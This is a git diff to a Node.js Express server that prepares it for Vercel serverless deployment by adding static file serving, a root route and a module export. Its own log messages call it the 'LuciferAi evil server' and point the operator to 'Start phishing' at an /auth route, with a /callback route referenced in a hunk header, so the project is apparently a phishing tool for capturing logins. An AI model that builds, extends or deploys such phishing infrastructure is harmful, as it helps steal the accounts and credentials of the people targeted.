@@ -2,6 +2,7 @@
 require("dotenv").config();
 const express = require("express");
 const axios = require("axios");
+const path = require("path");
 const app = express();
 const port = 3000;
 
@@ -114,8 +115,22 @@ app.get("/callback", async (req, res) => {
 });
 
 // ──────────────────────────────────────────────────────────────────────
-// Start server
-app.listen(port, () => {
-  console.log(`LuciferAi evil server running → http://localhost:${port}`);
-  console.log(`Start phishing: http://localhost:${port}/auth`);
+// Serve static files from the 'public' directory
+app.use(express.static(path.join(__dirname, "public")));
+
+// Route to serve the HTML file
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "index.html"));
 });
+
+// ──────────────────────────────────────────────────────────────────────
+// Start server (local development)
+if (process.env.NODE_ENV !== 'production') {
+  app.listen(port, () => {
+    console.log(`LuciferAi evil server running → http://localhost:${port}`);
+    console.log(`Start phishing: http://localhost:${port}/auth`);
+  });
+}
+
+// Export for Vercel serverless
+module.exports = app;
